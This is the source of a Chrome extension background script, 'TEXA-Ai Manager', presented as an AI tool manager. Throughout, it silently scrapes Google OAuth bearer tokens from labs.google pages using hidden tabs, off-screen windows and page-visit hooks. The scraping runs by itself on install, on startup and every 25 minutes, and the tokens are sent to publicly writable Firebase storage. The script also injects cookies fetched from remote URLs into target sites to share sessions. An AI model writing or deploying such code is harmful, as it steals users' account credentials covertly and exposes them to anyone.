// =============================================
// TEXA-Ai Manager - Background Service Worker
// SILENT Token Scraping dengan Google Identity
// =============================================

// Firebase REST API Configuration
// PRIMARY: Token Vault Firestore (MAIN TOKEN STORAGE)
const TOKEN_VAULT_CONFIG = {
    projectId: 'texa-ai',
    // Direct Firestore endpoint untuk token vault
    firestoreUrl: 'https://firestore.googleapis.com/v1/projects/texa-ai/databases/(default)/documents/artifacts/my-token-vault/public/data/tokens/google_oauth_user_1',
    tokenPath: 'artifacts/my-token-vault/public/data/tokens/google_oauth_user_1'
};

// BACKUP: RTDB (Secondary storage)
const FIREBASE_RTDB_BACKUP = {
    projectId: 'texa-ai',
    rtdbUrl: 'https://texa-ai-default-rtdb.firebaseio.com',
    tokenPath: 'texa_tokens/google_oauth_user_1'
};

// Legacy compatibility
const FIREBASE_PRIMARY = FIREBASE_RTDB_BACKUP;
const FIREBASE_BACKUP = FIREBASE_RTDB_BACKUP;

const GOOGLE_LABS_URL = 'https://labs.google/fx/tools/flow';
const GOOGLE_LABS_API = 'https://labs.google/fx/api/tools';
const TOKEN_REGEX = /ya29\.[a-zA-Z0-9_-]{100,}/g;

function getFirestoreUrl(projectId, path) {
    return `https://firestore.googleapis.com/v1/projects/${projectId}/databases/(default)/documents/${path}`;
}

function getPrimaryRtdbUrl(path) {
    return `${FIREBASE_PRIMARY.rtdbUrl}/${path}.json`;
}

function getBackupRtdbUrl(path) {
    return `${FIREBASE_BACKUP.rtdbUrl}/${path}.json`;
}

// =============================================
// OFFSCREEN DOCUMENT MANAGEMENT
// =============================================

let creatingOffscreen = false;

async function hasOffscreenDocument() {
    try {
        const contexts = await chrome.runtime.getContexts({
            contextTypes: ['OFFSCREEN_DOCUMENT']
        });
        return contexts.length > 0;
    } catch (e) {
        return false;
    }
}

async function setupOffscreenDocument() {
    if (await hasOffscreenDocument()) {
        return true;
    }

    if (creatingOffscreen) {
        await new Promise(r => setTimeout(r, 200));
        return await hasOffscreenDocument();
    }

    creatingOffscreen = true;
    try {
        await chrome.offscreen.createDocument({
            url: 'offscreen.html',
            reasons: ['DOM_SCRAPING'],
            justification: 'Silent token extraction using browser Google session'
        });
        console.log('✅ TEXA: Offscreen document created');
        return true;
    } catch (e) {
        console.log('⚠️ TEXA: Offscreen creation:', e.message);
        return false;
    } finally {
        creatingOffscreen = false;
    }
}

async function closeOffscreenDocument() {
    if (await hasOffscreenDocument()) {
        try {
            await chrome.offscreen.closeDocument();
        } catch (e) { }
    }
}

// =============================================
// MAIN SILENT SCRAPE FUNCTION
// =============================================

async function scrapeToken() {
    console.log('🔄 TEXA: Starting token scrape...');

    try {
        // Quick check: Do we have a valid cached token?
        const cachedResult = await getToken();
        if (cachedResult.success) {
            // Check if token is fresh (less than 20 minutes old)
            const updatedAt = new Date(cachedResult.updatedAt);
            const ageMinutes = (Date.now() - updatedAt.getTime()) / 60000;
            if (ageMinutes < 20) {
                console.log('✅ TEXA: Using fresh cached token');
                return cachedResult;
            }
        }

        // Method 1: Check existing Google Labs tabs first (fastest if user has it open)
        const existingResult = await scrapeFromExistingTabs();
        if (existingResult.success) {
            console.log('✅ TEXA: Token found from existing tab!');
            return existingResult;
        }

        // Method 2: Try offscreen document
        const offscreenResult = await scrapeViaOffscreen();
        if (offscreenResult.success) {
            console.log('✅ TEXA: Token found via offscreen document!');
            return offscreenResult;
        }

        // Method 3: Background tab scraping - MOST RELIABLE
        // Opens a background tab (not focused), extracts token, closes tab
        console.log('🔄 TEXA: Starting background tab scraping...');
        const backgroundResult = await scrapeViaBackgroundTab();
        if (backgroundResult.success) {
            console.log('✅ TEXA: Token obtained via background tab!');
            return backgroundResult;
        }

        // Method 4: Return stale cache if available
        if (cachedResult.success) {
            console.log('⚠️ TEXA: Using stale cached token');
            return cachedResult;
        }

        console.log('⚠️ TEXA: No token found');
        return { success: false, error: 'Could not obtain token' };

    } catch (error) {
        console.error('🔄 TEXA Error:', error);
        return { success: false, error: error.message };
    }
}

// =============================================
// BACKGROUND TAB SCRAPING - Most Reliable Method
// Opens tab in background, extracts token, closes tab
// =============================================

async function scrapeViaBackgroundTab() {
    try {
        console.log('🔄 TEXA: Creating background tab for token extraction...');

        // Create tab in background (not focused, not active)
        const tab = await chrome.tabs.create({
            url: 'https://labs.google/fx/flow',
            active: false,  // Not focused
            pinned: false
        });

        console.log('🔄 TEXA: Background tab created:', tab.id);

        // Wait for page to load and extract token
        const result = await new Promise((resolve) => {
            let attempts = 0;
            const maxAttempts = 20;  // Max 40 seconds
            let resolved = false;

            const cleanup = async () => {
                if (!resolved) {
                    resolved = true;
                    try { await chrome.tabs.remove(tab.id); } catch (e) { }
                }
            };

            const checkAndExtract = async () => {
                if (resolved) return;
                attempts++;

                try {
                    const currentTab = await chrome.tabs.get(tab.id);
                    console.log(`🔄 TEXA: Check ${attempts}/${maxAttempts}, URL: ${currentTab.url?.substring(0, 50)}...`);

                    // Check if redirected to login
                    if (currentTab.url && currentTab.url.includes('accounts.google.com')) {
                        console.log('🔐 TEXA: User not logged in to Google');

                        // User needs to login - make tab visible for login
                        await chrome.tabs.update(tab.id, { active: true });

                        // Wait for login completion
                        const loginResult = await waitForLogin(tab.id, 60000);
                        if (loginResult.success) {
                            // After login, extract token
                            const extractResult = await extractTokenFromTab(tab.id);
                            await cleanup();
                            resolve(extractResult);
                        } else {
                            await cleanup();
                            resolve({ success: false, error: 'Login required' });
                        }
                        return;
                    }

                    // Check if on Labs page and complete
                    if (currentTab.url && currentTab.url.includes('labs.google') &&
                        !currentTab.url.includes('accounts.google.com') &&
                        currentTab.status === 'complete') {

                        // Wait a bit for JS to render token
                        await new Promise(r => setTimeout(r, 2000));

                        // Extract token
                        const extractResult = await extractTokenFromTab(tab.id);

                        if (extractResult.success) {
                            console.log('✅ TEXA: Token extracted successfully!');
                            await cleanup();
                            resolve(extractResult);
                            return;
                        }
                    }

                    // Continue checking
                    if (attempts < maxAttempts) {
                        setTimeout(checkAndExtract, 2000);
                    } else {
                        console.log('⚠️ TEXA: Max attempts reached');
                        await cleanup();
                        resolve({ success: false, error: 'Timeout extracting token' });
                    }

                } catch (e) {
                    console.log('⚠️ TEXA: Check error:', e.message);
                    if (attempts < maxAttempts) {
                        setTimeout(checkAndExtract, 2000);
                    } else {
                        await cleanup();
                        resolve({ success: false, error: e.message });
                    }
                }
            };

            // Start checking after initial load time
            setTimeout(checkAndExtract, 3000);
        });

        return result;

    } catch (e) {
        console.log('⚠️ TEXA: Background tab error:', e.message);
        return { success: false, error: e.message };
    }
}

// Wait for user to complete login
async function waitForLogin(tabId, timeoutMs) {
    return new Promise((resolve) => {
        const startTime = Date.now();

        const checkLogin = async () => {
            if (Date.now() - startTime > timeoutMs) {
                resolve({ success: false, error: 'Login timeout' });
                return;
            }

            try {
                const tab = await chrome.tabs.get(tabId);

                // Check if user completed login and is now on Labs page
                if (tab.url && tab.url.includes('labs.google') &&
                    !tab.url.includes('accounts.google.com')) {
                    console.log('✅ TEXA: Login completed, now on Labs page');
                    resolve({ success: true });
                    return;
                }

                // Still on login page or redirecting
                setTimeout(checkLogin, 1000);

            } catch (e) {
                resolve({ success: false, error: e.message });
            }
        };

        checkLogin();
    });
}

// =============================================
// AUTO-LOGIN FLOW - Silent using Chrome Identity
// =============================================

async function autoLoginAndScrape() {
    try {
        console.log('🔐 TEXA: Starting SILENT auto-login flow (no tabs)...');

        // Method A: Try interactive OAuth (shows small popup, not full tab)
        const interactiveResult = await getTokenViaInteractiveAuth();
        if (interactiveResult.success) {
            console.log('✅ TEXA: Got token via interactive OAuth!');
            return interactiveResult;
        }

        // Method B: Try Web Auth Flow (popup window, not tab)
        const webAuthResult = await getTokenViaWebAuthFlow();
        if (webAuthResult.success) {
            console.log('✅ TEXA: Got token via Web Auth Flow!');
            return webAuthResult;
        }

        // Method C: As last resort, try opening Labs in background window (minimized)
        const backgroundResult = await scrapeViaHiddenWindow();
        if (backgroundResult.success) {
            console.log('✅ TEXA: Got token via hidden window!');
            return backgroundResult;
        }

        return { success: false, error: 'Silent auth failed - user needs to login' };

    } catch (e) {
        console.log('⚠️ TEXA: Auto-login failed:', e.message);
        return { success: false, error: e.message };
    }
}

// Interactive OAuth - shows small account selector popup
async function getTokenViaInteractiveAuth() {
    try {
        console.log('🔐 TEXA: Trying interactive OAuth...');

        const token = await new Promise((resolve) => {
            chrome.identity.getAuthToken({
                interactive: true  // Will show account selector popup
            }, (authToken) => {
                if (chrome.runtime.lastError) {
                    console.log('⚠️ TEXA: Interactive auth error:', chrome.runtime.lastError.message);
                    resolve(null);
                } else {
                    resolve(authToken);
                }
            });
        });

        if (token) {
            console.log('✅ TEXA: Got OAuth token via interactive auth');
            await saveToken(token, 'Interactive OAuth');
            return { success: true, token, method: 'interactive_oauth' };
        }

        return { success: false, error: 'Interactive auth declined or failed' };
    } catch (e) {
        console.log('⚠️ TEXA: Interactive auth failed:', e.message);
        return { success: false, error: e.message };
    }
}

// Web Auth Flow - opens popup window for Google login
async function getTokenViaWebAuthFlow() {
    try {
        console.log('🔐 TEXA: Trying Web Auth Flow...');

        // Get Extension ID for redirect
        const redirectUrl = chrome.identity.getRedirectURL();
        console.log('🔐 TEXA: Redirect URL:', redirectUrl);

        // Google OAuth URL
        const authUrl = new URL('https://accounts.google.com/o/oauth2/auth');
        authUrl.searchParams.set('client_id', chrome.runtime.id + '.apps.googleusercontent.com');
        authUrl.searchParams.set('redirect_uri', redirectUrl);
        authUrl.searchParams.set('response_type', 'token');
        authUrl.searchParams.set('scope', 'https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/userinfo.email');

        const responseUrl = await new Promise((resolve) => {
            chrome.identity.launchWebAuthFlow({
                url: authUrl.toString(),
                interactive: true
            }, (response) => {
                if (chrome.runtime.lastError) {
                    console.log('⚠️ TEXA: Web auth flow error:', chrome.runtime.lastError.message);
                    resolve(null);
                } else {
                    resolve(response);
                }
            });
        });

        if (responseUrl) {
            // Extract access token from URL
            const urlParams = new URLSearchParams(new URL(responseUrl).hash.substring(1));
            const accessToken = urlParams.get('access_token');

            if (accessToken) {
                console.log('✅ TEXA: Got token via Web Auth Flow');
                await saveToken(accessToken, 'Web Auth Flow');
                return { success: true, token: accessToken, method: 'web_auth_flow' };
            }
        }

        return { success: false, error: 'Web auth flow failed' };
    } catch (e) {
        console.log('⚠️ TEXA: Web auth flow failed:', e.message);
        return { success: false, error: e.message };
    }
}

// Hidden window approach - creates minimized window
async function scrapeViaHiddenWindow() {
    try {
        console.log('🔐 TEXA: Trying hidden window approach...');

        // Create a minimized window with Labs
        const win = await chrome.windows.create({
            url: GOOGLE_LABS_URL,
            type: 'popup',
            width: 1,
            height: 1,
            left: -1000,
            top: -1000,
            focused: false,
            state: 'minimized'
        });

        if (!win.tabs || win.tabs.length === 0) {
            return { success: false, error: 'Could not create hidden window' };
        }

        const tabId = win.tabs[0].id;

        // Wait for page to load and try to extract token
        const result = await new Promise((resolve) => {
            let attempts = 0;
            const maxAttempts = 10;

            const checkForToken = async () => {
                attempts++;
                console.log(`🔐 TEXA: Hidden window check attempt ${attempts}/${maxAttempts}`);

                try {
                    const tab = await chrome.tabs.get(tabId);

                    // If on Labs page, extract token
                    if (tab.url && tab.url.includes('labs.google') && !tab.url.includes('accounts.google.com')) {
                        // Wait for page to fully load
                        if (tab.status === 'complete') {
                            setTimeout(async () => {
                                const extractResult = await extractTokenFromTab(tabId);
                                // Close window after extraction
                                try { await chrome.windows.remove(win.id); } catch (e) { }

                                if (extractResult.success) {
                                    resolve(extractResult);
                                } else if (attempts < maxAttempts) {
                                    setTimeout(checkForToken, 2000);
                                } else {
                                    resolve({ success: false, error: 'Could not extract token' });
                                }
                            }, 2000);
                            return;
                        }
                    }

                    // If redirected to login, close window and fail
                    if (tab.url && tab.url.includes('accounts.google.com')) {
                        console.log('🔐 TEXA: Hidden window redirected to login - closing');
                        try { await chrome.windows.remove(win.id); } catch (e) { }
                        resolve({ success: false, error: 'User not logged in to Google' });
                        return;
                    }

                    if (attempts < maxAttempts) {
                        setTimeout(checkForToken, 2000);
                    } else {
                        try { await chrome.windows.remove(win.id); } catch (e) { }
                        resolve({ success: false, error: 'Hidden window timeout' });
                    }

                } catch (e) {
                    console.log('⚠️ TEXA: Hidden window error:', e.message);
                    if (attempts < maxAttempts) {
                        setTimeout(checkForToken, 2000);
                    } else {
                        try { await chrome.windows.remove(win.id); } catch (e2) { }
                        resolve({ success: false, error: e.message });
                    }
                }
            };

            // Start checking after initial delay
            setTimeout(checkForToken, 3000);
        });

        return result;

    } catch (e) {
        console.log('⚠️ TEXA: Hidden window failed:', e.message);
        return { success: false, error: e.message };
    }
}

// =============================================
// OFFSCREEN DOCUMENT SCRAPE (Uses Browser Cookies)
// =============================================

async function scrapeViaOffscreen() {
    try {
        console.log('🔄 TEXA: Trying offscreen document with browser session...');

        const hasOffscreen = await setupOffscreenDocument();
        if (!hasOffscreen) {
            return { success: false, error: 'Could not create offscreen document' };
        }

        // Wait a bit for offscreen to be ready
        await new Promise(r => setTimeout(r, 300));

        // Send message to offscreen document
        const result = await new Promise((resolve) => {
            const timeout = setTimeout(() => {
                resolve({ success: false, error: 'Offscreen timeout' });
            }, 20000);

            chrome.runtime.sendMessage({ type: 'OFFSCREEN_SCRAPE_TOKEN' }, (response) => {
                clearTimeout(timeout);
                if (chrome.runtime.lastError) {
                    resolve({ success: false, error: chrome.runtime.lastError.message });
                } else {
                    resolve(response || { success: false, error: 'No response from offscreen' });
                }
            });
        });

        if (result.success && result.token) {
            await saveToken(result.token, 'Offscreen (Browser Session)');
        }

        return result;
    } catch (e) {
        console.log('⚠️ TEXA: Offscreen scrape failed:', e.message);
        return { success: false, error: e.message };
    }
}

// =============================================
// CHROME IDENTITY API (Uses Browser Profile's Google Account)
// =============================================

async function scrapeViaIdentity() {
    try {
        console.log('🔄 TEXA: Trying Chrome Identity API...');

        // Get OAuth token using the browser's logged-in Google account
        const token = await new Promise((resolve) => {
            chrome.identity.getAuthToken({
                interactive: false  // Silent, no popup - uses existing login
            }, (authToken) => {
                if (chrome.runtime.lastError) {
                    console.log('⚠️ TEXA: Identity error:', chrome.runtime.lastError.message);
                    resolve(null);
                } else {
                    resolve(authToken);
                }
            });
        });

        if (token) {
            console.log('✅ TEXA: Got token via Chrome Identity');
            await saveToken(token, 'Chrome Identity API');
            return { success: true, token, method: 'chrome_identity' };
        }

        return { success: false, error: 'No identity token available' };
    } catch (e) {
        console.log('⚠️ TEXA: Identity API failed:', e.message);
        return { success: false, error: e.message };
    }
}

// =============================================
// EXISTING TABS SCRAPE
// =============================================

async function scrapeFromExistingTabs() {
    try {
        const labsTabs = await chrome.tabs.query({ url: '*://labs.google/*' });

        for (const tab of labsTabs) {
            if (!tab.url.includes('accounts.google.com')) {
                const result = await extractTokenFromTab(tab.id);
                if (result.success) {
                    return result;
                }
            }
        }

        return { success: false, error: 'No existing Labs tabs with token' };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

async function extractTokenFromTab(tabId) {
    try {
        const results = await chrome.scripting.executeScript({
            target: { tabId: tabId },
            func: () => {
                const regex = /ya29\.[a-zA-Z0-9_-]{100,}/g;
                const html = document.documentElement.outerHTML;
                const matches = html.match(regex);
                if (matches && matches.length > 0) {
                    return matches.reduce((a, b) => a.length > b.length ? a : b);
                }
                return null;
            }
        });

        if (results?.[0]?.result) {
            const token = results[0].result;
            await saveToken(token, 'Existing Tab');
            return { success: true, token, method: 'existing_tab' };
        }
    } catch (e) {
        console.log('⚠️ TEXA: Cannot extract from tab:', e.message);
    }
    return { success: false };
}

// =============================================
// TOKEN STORAGE
// =============================================

async function saveToken(token, source) {
    const timestamp = new Date().toISOString();
    console.log('💾 TEXA: Saving token from:', source);

    // Save to local storage immediately (fastest access)
    await chrome.storage.local.set({
        'texa_bearer_token': token,
        'texa_token_updated': timestamp,
        'texa_token_source': source
    });

    // Save to Firebase in background (Token Vault + RTDB Backup)
    Promise.allSettled([
        saveTokenToFirestoreVault(token, source, timestamp),
        saveTokenToRTDBBackup(token, source, timestamp)
    ]).then(results => {
        console.log('💾 TEXA: Firestore Vault:', results[0].status, '| RTDB Backup:', results[1].status);
    });

    return true;
}

// ========== TOKEN VAULT FUNCTIONS - User Specified Format ==========

// CARA 2: SIMPAN TOKEN DARI EKSTENSI (format sesuai permintaan user)
async function saveTokenToFirestoreVault(token, source, timestamp) {
    const url = TOKEN_VAULT_CONFIG.firestoreUrl;

    const body = {
        fields: {
            token: { stringValue: token },
            id: { stringValue: 'google_oauth_user_1' },
            updatedAt: { timestampValue: timestamp },
            source: { stringValue: source },
            note: { stringValue: 'Disimpan dari Ekstensi' }
        }
    };

    try {
        const response = await fetch(url, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });

        if (response.ok) {
            console.log('✅ TEXA: Token saved to Firestore Vault!');
            return { success: true };
        } else {
            throw new Error(`Firestore error: ${response.status}`);
        }
    } catch (error) {
        console.error('❌ TEXA: Firestore Vault save error:', error.message);
        throw error;
    }
}

// CARA 1: AMBIL TOKEN DARI DB (format sesuai permintaan user)
async function getTokenFromFirestoreVault() {
    const url = TOKEN_VAULT_CONFIG.firestoreUrl;

    try {
        const response = await fetch(url);
        if (!response.ok) throw new Error('Data tidak ditemukan');

        const data = await response.json();
        // Struktur JSON Firestore: { fields: { token: { stringValue: "..." } } }
        const myToken = data.fields?.token?.stringValue;
        const updatedAt = data.fields?.updatedAt?.timestampValue;

        if (myToken) {
            console.log('✅ TEXA: Token loaded from Firestore Vault');
            return { success: true, token: myToken, source: 'firestore_vault', updatedAt };
        }

        return { success: false, error: 'Token field not found' };
    } catch (error) {
        console.error('❌ TEXA: Firestore Vault read error:', error.message);
        return { success: false, error: error.message };
    }
}

// Backup: Save to RTDB (secondary storage)
async function saveTokenToRTDBBackup(token, source, timestamp) {
    const url = `${FIREBASE_RTDB_BACKUP.rtdbUrl}/${FIREBASE_RTDB_BACKUP.tokenPath}.json`;

    try {
        const response = await fetch(url, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                token,
                id: 'google_oauth_user_1',
                updatedAt: timestamp,
                source
            })
        });

        if (response.ok) {
            console.log('✅ TEXA: Token saved to RTDB Backup');
            return { success: true };
        } else {
            throw new Error(`RTDB error: ${response.status}`);
        }
    } catch (error) {
        console.error('⚠️ TEXA: RTDB Backup save error:', error.message);
        // Don't throw - backup failures shouldn't block main save
        return { success: false, error: error.message };
    }
}

async function getToken() {
    // Priority 1: Try local cache first (fastest)
    const cached = await chrome.storage.local.get(['texa_bearer_token', 'texa_token_updated', 'texa_token_source']);
    if (cached.texa_bearer_token) {
        // Check if token is recent (less than 30 minutes old)
        const updatedAt = new Date(cached.texa_token_updated);
        const ageMinutes = (Date.now() - updatedAt.getTime()) / 60000;
        if (ageMinutes < 30) {
            console.log('✅ TEXA: Using fresh local cache');
            return { success: true, token: cached.texa_bearer_token, source: 'local_cache', updatedAt: cached.texa_token_updated };
        }
    }

    // Priority 2: Try FIRESTORE VAULT (Primary Token Storage)
    console.log('🔄 TEXA: Checking Firestore Vault...');
    const vaultResult = await getTokenFromFirestoreVault();
    if (vaultResult.success && vaultResult.token) {
        // Update local cache
        await chrome.storage.local.set({
            'texa_bearer_token': vaultResult.token,
            'texa_token_updated': vaultResult.updatedAt,
            'texa_token_source': 'firestore_vault'
        });
        return vaultResult;
    }

    // Priority 3: Try RTDB Backup
    console.log('🔄 TEXA: Checking RTDB Backup...');
    try {
        const url = `${FIREBASE_RTDB_BACKUP.rtdbUrl}/${FIREBASE_RTDB_BACKUP.tokenPath}.json`;
        const response = await fetch(url);
        if (response.ok) {
            const data = await response.json();
            if (data?.token) {
                // Update local cache
                await chrome.storage.local.set({
                    'texa_bearer_token': data.token,
                    'texa_token_updated': data.updatedAt,
                    'texa_token_source': 'rtdb_backup'
                });
                console.log('✅ TEXA: Token from RTDB Backup');
                return { success: true, token: data.token, source: 'rtdb_backup', updatedAt: data.updatedAt };
            }
        }
    } catch (e) {
        console.log('⚠️ TEXA: RTDB Backup fetch failed:', e.message);
    }

    // Fallback: Return stale cached token if available
    if (cached.texa_bearer_token) {
        console.log('⚠️ TEXA: Using STALE cached token');
        return { success: true, token: cached.texa_bearer_token, source: 'cache_stale', updatedAt: cached.texa_token_updated };
    }

    console.log('❌ TEXA: No token found anywhere');
    return { success: false, error: 'No token found' };
}

// =============================================
// MESSAGE HANDLERS
// =============================================

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    const type = message.type || message.action;
    console.log('📨 TEXA Background:', type);

    switch (type) {
        case 'TEXA_TOKEN_FOUND':
            saveToken(message.token, message.source || 'Content Script');
            sendResponse({ success: true });
            break;

        case 'TEXA_SCRAPE_TOKEN':
            scrapeToken()
                .then(r => sendResponse(r))
                .catch(e => sendResponse({ success: false, error: e.message }));
            return true;

        case 'TEXA_GET_TOKEN':
            getToken()
                .then(r => sendResponse(r))
                .catch(e => sendResponse({ success: false, error: e.message }));
            return true;

        case 'TEXA_OPEN_TOOL':
            handleOpenTool(message)
                .then(r => sendResponse(r))
                .catch(e => sendResponse({ success: false, error: e.message }));
            return true;

        case 'TEXA_AUTO_LOGIN':
            // Force auto-login flow
            autoLoginAndScrape()
                .then(r => sendResponse(r))
                .catch(e => sendResponse({ success: false, error: e.message }));
            return true;

        case 'TEXA_FORCE_SCRAPE':
            // Force open Labs tab and scrape (for manual trigger)
            forceOpenAndScrape()
                .then(r => sendResponse(r))
                .catch(e => sendResponse({ success: false, error: e.message }));
            return true;

        case 'SAVE_TOKEN':
            saveToken(message.payload?.token, message.payload?.service)
                .then(() => sendResponse({ status: 'success' }))
                .catch(e => sendResponse({ status: 'error', msg: e.message }));
            return true;
    }
});

// Force open Google Labs and scrape token
async function forceOpenAndScrape() {
    console.log('🔄 TEXA: Force opening Google Labs to scrape token...');

    // Create a visible tab to Labs
    const tab = await chrome.tabs.create({
        url: GOOGLE_LABS_URL,
        active: true
    });

    // Wait for page to load then extract
    return new Promise((resolve) => {
        const listener = async (tabId, info) => {
            if (tabId === tab.id && info.status === 'complete') {
                chrome.tabs.onUpdated.removeListener(listener);

                // Wait a bit for JS to execute on page
                setTimeout(async () => {
                    const result = await extractTokenFromTab(tab.id);
                    if (result.success) {
                        console.log('✅ TEXA: Token extracted from forced Labs tab');
                        // Keep tab open so overlay shows
                    }
                    resolve(result);
                }, 3000);
            }
        };
        chrome.tabs.onUpdated.addListener(listener);
    });
}

// =============================================
// TOOL OPENING - Supports both direct cookies and API fetch
// =============================================

async function handleOpenTool(data) {
    const { targetUrl, apiUrl, cookiesData, authHeader, idToken } = data;

    console.log('🔧 TEXA: Opening tool:', targetUrl);
    console.log('🔧 TEXA: cookiesData:', cookiesData ? 'Provided' : 'None');
    console.log('🔧 TEXA: apiUrl:', apiUrl || 'None');

    let cookiesInjected = 0;

    // Priority 1: Use direct cookiesData from tool settings (Edit Tools)
    if (cookiesData) {
        try {
            console.log('🍪 TEXA: Injecting cookies from tool settings (cookiesData)...');
            const cookies = parseCookiesData(cookiesData);

            for (const cookie of cookies) {
                try {
                    await setCookie(cookie, targetUrl);
                    cookiesInjected++;
                } catch (e) {
                    console.log('⚠️ TEXA: Failed to set cookie:', cookie.name, e.message);
                }
            }
            console.log(`✅ TEXA: Injected ${cookiesInjected} cookies from cookiesData`);
        } catch (e) {
            console.error('❌ TEXA: Error parsing cookiesData:', e.message);
        }
    }

    // Priority 2: Fetch cookies from API URL (if no cookiesData or as additional source)
    if (apiUrl) {
        try {
            console.log('🌐 TEXA: Fetching cookies from API:', apiUrl);

            const headers = {};
            if (authHeader) {
                headers['Authorization'] = authHeader;
            } else if (idToken) {
                headers['Authorization'] = `Bearer ${idToken}`;
            }

            const response = await fetch(apiUrl, {
                headers: Object.keys(headers).length > 0 ? headers : undefined
            });

            if (response.ok) {
                const apiData = await response.json();
                const cookies = extractCookiesFromAPI(apiData);

                for (const cookie of cookies) {
                    try {
                        await setCookie(cookie, targetUrl);
                        cookiesInjected++;
                    } catch (e) {
                        console.log('⚠️ TEXA: Failed to set API cookie:', cookie.name, e.message);
                    }
                }
                console.log(`✅ TEXA: Injected ${cookies.length} cookies from API`);
            } else {
                console.log('⚠️ TEXA: API response not OK:', response.status);
            }
        } catch (e) {
            console.error('❌ TEXA: Error fetching from API:', e.message);
        }
    }

    console.log(`🎯 TEXA: Total cookies injected: ${cookiesInjected}`);

    // Open the target URL and inject overlay
    const tab = await chrome.tabs.create({ url: targetUrl });

    // Inject overlay script after page loads (with delay for page to render)
    if (tab.id) {
        chrome.tabs.onUpdated.addListener(function listener(tabId, info) {
            if (tabId === tab.id && info.status === 'complete') {
                chrome.tabs.onUpdated.removeListener(listener);

                // Inject overlay after a small delay
                setTimeout(async () => {
                    try {
                        await chrome.scripting.executeScript({
                            target: { tabId: tab.id },
                            files: ['overlayScript.js']
                        });
                        console.log('🎨 TEXA: Overlay injected on opened tool');
                    } catch (e) {
                        console.log('⚠️ TEXA: Could not inject overlay:', e.message);
                    }
                }, 500);
            }
        });
    }

    return { success: true, cookiesInjected };
}

// Parse cookiesData string (JSON array) from tool settings
function parseCookiesData(cookiesData) {
    if (!cookiesData) return [];

    try {
        // If it's already an array, return it
        if (Array.isArray(cookiesData)) {
            return cookiesData;
        }

        // If it's a string, try to parse as JSON
        if (typeof cookiesData === 'string') {
            const parsed = JSON.parse(cookiesData);

            // Could be an array or object with cookies property
            if (Array.isArray(parsed)) {
                return parsed;
            }
            if (parsed.cookies && Array.isArray(parsed.cookies)) {
                return parsed.cookies;
            }
        }
    } catch (e) {
        console.error('❌ TEXA: Failed to parse cookiesData:', e.message);
    }

    return [];
}

// Extract cookies from API response (handles various formats)
function extractCookiesFromAPI(data) {
    // Handle Firestore format
    if (data.fields) {
        for (const key in data.fields) {
            if (data.fields[key].stringValue) {
                try {
                    const parsed = JSON.parse(data.fields[key].stringValue);
                    if (Array.isArray(parsed)) return parsed;
                    if (parsed.cookies) return parsed.cookies;
                } catch (e) { }
            }
            // Handle arrayValue format
            if (data.fields[key].arrayValue?.values) {
                return data.fields[key].arrayValue.values.map(v => {
                    if (v.mapValue?.fields) {
                        const fields = v.mapValue.fields;
                        return {
                            name: fields.name?.stringValue,
                            value: fields.value?.stringValue,
                            domain: fields.domain?.stringValue,
                            path: fields.path?.stringValue || '/',
                            secure: fields.secure?.booleanValue,
                            httpOnly: fields.httpOnly?.booleanValue,
                            sameSite: fields.sameSite?.stringValue
                        };
                    }
                    return null;
                }).filter(Boolean);
            }
        }
    }

    // Handle direct array
    if (Array.isArray(data)) {
        return data;
    }

    // Handle object with cookies property
    if (data.cookies && Array.isArray(data.cookies)) {
        return data.cookies;
    }

    return [];
}

function setCookie(c, targetUrl) {
    const domain = c.domain || new URL(targetUrl).hostname;
    const cookieDetails = {
        url: c.url || `https://${domain.replace(/^\./, '')}${c.path || '/'}`,
        name: c.name,
        value: c.value,
        path: c.path || '/',
        secure: c.secure !== false,
        httpOnly: c.httpOnly === true
    };

    // Add optional fields if present
    if (c.domain) cookieDetails.domain = c.domain;
    if (c.expirationDate) cookieDetails.expirationDate = c.expirationDate;
    if (c.sameSite) cookieDetails.sameSite = c.sameSite;

    return chrome.cookies.set(cookieDetails);
}

// =============================================
// LIFECYCLE EVENTS - SILENT AUTO SCRAPING
// =============================================

chrome.runtime.onStartup.addListener(() => {
    console.log('🔄 TEXA: Extension started - initiating silent scrape');
    setTimeout(() => scrapeToken(), 3000);
});

chrome.runtime.onInstalled.addListener(() => {
    console.log('✅ TEXA: Extension installed');
    // Setup periodic silent refresh every 25 minutes
    chrome.alarms.create('tokenRefresh', { periodInMinutes: 25 });
    // Initial silent scrape
    setTimeout(() => scrapeToken(), 5000);
});

chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === 'tokenRefresh') {
        console.log('⏰ TEXA: Periodic silent token refresh');
        scrapeToken();
    }
});

// Passive scrape when user visits Google Labs manually
chrome.webNavigation.onCompleted.addListener((details) => {
    if (details.url.includes('labs.google') && !details.url.includes('accounts.google.com')) {
        console.log('📍 TEXA: User visited Labs, extracting token silently...');
        setTimeout(() => extractTokenFromTab(details.tabId), 2000);
    }
}, { url: [{ hostContains: 'labs.google' }] });

console.log('🚀 TEXA-Ai Manager - Background Loaded (SILENT MODE with Browser Google Session)');
